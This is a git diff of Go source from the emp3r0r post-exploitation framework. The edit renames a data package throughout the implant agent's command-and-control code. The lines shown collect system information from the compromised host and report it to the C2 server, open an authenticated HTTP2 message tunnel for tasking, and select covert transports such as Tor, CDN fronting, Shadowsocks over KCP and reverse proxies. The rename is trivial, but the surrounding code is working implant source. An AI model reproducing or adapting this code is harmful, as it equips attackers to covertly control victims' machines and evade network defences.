@@ -17,7 +17,7 @@ import (
 	"time"
 
 	"github.com/google/uuid"
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
@@ -26,7 +26,7 @@ import (
 // CheckIn poll CC server and report its system info
 func CheckIn() (err error) {
 	info := CollectSystemInfo()
-	checkin_URL := emp3r0r_data.CCAddress + tun.CheckInAPI + "/" + uuid.NewString()
+	checkin_URL := emp3r0r_def.CCAddress + tun.CheckInAPI + "/" + uuid.NewString()
 	log.Printf("Collected system info, now checking in (%s)", checkin_URL)
 
 	conn, _, _, err := ConnectCC(checkin_URL)
@@ -51,7 +51,7 @@ func IsCCOnline(proxy string) bool {
 		}).Dial,
 		TLSHandshakeTimeout: 60 * time.Second,
 	}
-	if proxy != "" && strings.HasPrefix(emp3r0r_data.Transport, "HTTP2") {
+	if proxy != "" && strings.HasPrefix(emp3r0r_def.Transport, "HTTP2") {
 		proxyUrl, err := url.Parse(proxy)
 		if err != nil {
 			log.Fatalf("invalid proxy: %v", err)
@@ -102,7 +102,7 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 	ctx, cancel = context.WithCancel(context.Background())
 
 	h2 := h2conn.Client{
-		Client: emp3r0r_data.HTTPClient,
+		Client: emp3r0r_def.HTTPClient,
 		Header: http.Header{
 			"AgentUUID":    {RuntimeConfig.AgentUUID},
 			"AgentUUIDSig": {RuntimeConfig.AgentUUIDSig},
@@ -144,19 +144,19 @@ var (
 // CCMsgTun use the connection (CCConn)
 func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	var (
-		in  = json.NewDecoder(emp3r0r_data.CCMsgConn)
-		out = json.NewEncoder(emp3r0r_data.CCMsgConn)
-		msg emp3r0r_data.MsgTunData // data being exchanged in the tunnel
+		in  = json.NewDecoder(emp3r0r_def.CCMsgConn)
+		out = json.NewEncoder(emp3r0r_def.CCMsgConn)
+		msg emp3r0r_def.MsgTunData // data being exchanged in the tunnel
 	)
 	go catchInterruptAndExit(cancel)
 	defer func() {
-		err = emp3r0r_data.CCMsgConn.Close()
+		err = emp3r0r_def.CCMsgConn.Close()
 		if err != nil {
 			log.Print("CCMsgTun closing: ", err)
 		}
 
 		cancel()
-		emp3r0r_data.KCPKeep = false // tell KCPClient to close this conn so we won't stuck
+		emp3r0r_def.KCPKeep = false // tell KCPClient to close this conn so we won't stuck
 		log.Print("CCMsgTun closed")
 	}()
 
@@ -217,7 +217,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	}
 
 	sendHello := func(cnt int) bool {
-		var hello_msg emp3r0r_data.MsgTunData
+		var hello_msg emp3r0r_def.MsgTunData
 		// try cnt times then exit
 		for cnt > 0 {
 			cnt-- // consume cnt
@@ -264,19 +264,19 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 // set C2Transport
 func setC2Transport() {
-	if tun.IsTor(emp3r0r_data.CCAddress) {
-		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
+	if tun.IsTor(emp3r0r_def.CCAddress) {
+		emp3r0r_def.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_def.CCAddress)
 		return
 	} else if RuntimeConfig.CDNProxy != "" {
-		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", RuntimeConfig.CDNProxy)
+		emp3r0r_def.Transport = fmt.Sprintf("CDN (%s)", RuntimeConfig.CDNProxy)
 		return
 	} else if RuntimeConfig.UseShadowsocks {
-		emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) to %s",
-			RuntimeConfig.ShadowsocksServerPort, emp3r0r_data.CCAddress)
+		emp3r0r_def.Transport = fmt.Sprintf("Shadowsocks (*:%s) to %s",
+			RuntimeConfig.ShadowsocksServerPort, emp3r0r_def.CCAddress)
 		// ss thru KCP
 		if RuntimeConfig.UseKCP {
-			emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s) to %s",
-				RuntimeConfig.ShadowsocksServerPort, RuntimeConfig.KCPServerPort, emp3r0r_data.CCAddress)
+			emp3r0r_def.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s) to %s",
+				RuntimeConfig.ShadowsocksServerPort, RuntimeConfig.KCPServerPort, emp3r0r_def.CCAddress)
 		}
 		return
 	} else if RuntimeConfig.C2TransportProxy != "" {
@@ -288,17 +288,17 @@ func setC2Transport() {
 
 		// if the proxy port is emp3r0r proxy server's port
 		if proxyURL.Port() == RuntimeConfig.Emp3r0rProxyServerPort && proxyURL.Hostname() == "127.0.0.1" {
-			emp3r0r_data.Transport = fmt.Sprintf("Reverse Proxy: %s", RuntimeConfig.C2TransportProxy)
+			emp3r0r_def.Transport = fmt.Sprintf("Reverse Proxy: %s", RuntimeConfig.C2TransportProxy)
 			return
 		}
 		if proxyURL.Port() == RuntimeConfig.ShadowsocksLocalSocksPort && proxyURL.Hostname() == "127.0.0.1" {
-			emp3r0r_data.Transport = fmt.Sprintf("Auto Proxy: %s", RuntimeConfig.C2TransportProxy)
+			emp3r0r_def.Transport = fmt.Sprintf("Auto Proxy: %s", RuntimeConfig.C2TransportProxy)
 			return
 		}
 
-		emp3r0r_data.Transport = fmt.Sprintf("Proxy %s", RuntimeConfig.C2TransportProxy)
+		emp3r0r_def.Transport = fmt.Sprintf("Proxy %s", RuntimeConfig.C2TransportProxy)
 		return
 	} else {
-		emp3r0r_data.Transport = fmt.Sprintf("HTTP2 (%s)", emp3r0r_data.CCAddress)
+		emp3r0r_def.Transport = fmt.Sprintf("HTTP2 (%s)", emp3r0r_def.CCAddress)
 	}
 }
